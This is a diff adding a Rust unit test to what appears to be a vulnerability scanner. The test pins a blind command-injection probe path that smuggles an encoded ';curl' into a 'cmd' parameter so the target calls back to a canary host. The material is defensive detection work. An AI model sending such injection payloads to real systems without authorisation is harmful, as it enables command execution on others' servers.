@@ -6483,6 +6483,34 @@ mod tests {
         );
     }
 
+    /// Guard: `blind_cmdi_coercion_path` builds the actual injection the check relies
+    /// on, a URL-encoded shell-injected `curl` that fetches the canary at `/{token}`.
+    /// The replay tamper-check uses this SAME builder for both the recorded and the
+    /// expected path, so a mutation to the template moves both sides together and the
+    /// Docker loop cannot catch it (RK-003 symmetry); only this offline literal pin
+    /// does, and on every gate rather than opt-in Docker (RK-014). Pure, no Docker.
+    /// Mutation: drop the `%3B` (the injecting `;`), the `curl`, or the token from the
+    /// template -> the matching assertion fails.
+    #[test]
+    fn blind_cmdi_coercion_path_injects_a_callback_curl() {
+        let path = blind_cmdi_coercion_path("canary", 8082, "tok12345");
+        assert_eq!(
+            path, "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345",
+            "the coercion injects a URL-encoded `;curl -s http://<canary>:<port>/<token>` at /exec"
+        );
+        // Each piece is load-bearing for the callback: the injecting semicolon (%3B
+        // ends `echo x` and starts a new command), the HTTP client, and the token.
+        assert!(path.starts_with("/exec?cmd="));
+        assert!(
+            path.contains("%3B") && path.contains("curl"),
+            "the path injects a new command (%3B) that runs curl: {path:?}"
+        );
+        assert!(
+            path.contains("tok12345"),
+            "the token is the callback target: {path:?}"
+        );
+    }
+
     /// Guard: the blind command-injection draft attributes the witness to the coerced
     /// app (`target`), not the canary (the observation point): the canary lives only
     /// in the reproduction params (#87, ADR-0023, parallel to the SSRF draft). Pure,
